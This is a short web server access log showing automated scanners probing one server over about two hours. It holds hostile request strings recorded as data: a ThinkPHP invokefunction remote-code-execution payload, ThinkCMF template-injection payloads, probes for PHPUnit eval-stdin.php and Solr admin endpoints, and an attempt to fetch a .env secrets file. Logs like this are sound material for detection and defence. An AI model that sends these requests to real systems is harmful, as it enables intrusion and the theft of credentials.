20.41.113.162 - - [13/May/2022:17:54:26 +0000] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 443 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.41.113.162 - - [13/May/2022:17:54:26 +0000] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 443 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.41.113.162 - - [13/May/2022:17:54:26 +0000] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 443 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.104.88.48 - - [13/May/2022:18:12:45 +0000] "\x16\x03" 400 488 "-" "-"
172.104.88.48 - - [13/May/2022:18:12:45 +0000] "GET /0irQ HTTP/1.1" 404 407 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
172.104.88.48 - - [13/May/2022:18:12:45 +0000] "GET /FvJW HTTP/1.1" 404 407 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
45.9.20.101 - - [13/May/2022:18:22:29 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.9.20.101 - - [13/May/2022:18:47:56 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.9.20.101 - - [13/May/2022:19:13:51 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.125.57.153 - - [13/May/2022:19:45:39 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.125.57.153 - - [13/May/2022:19:45:39 +0000] "POST / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.9.20.101 - - [13/May/2022:19:50:03 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 302 893 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.9.20.101 - - [13/May/2022:19:50:13 +0000] "GET /login?next=%2F%3Fa%3Dfetch%26content%3D%253Cphp%253Edie%28%2540md5%28HelloThinkCMF%29%29%253C%252Fphp%253E HTTP/1.1" 200 1552 "http://174.138.17.206:80/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
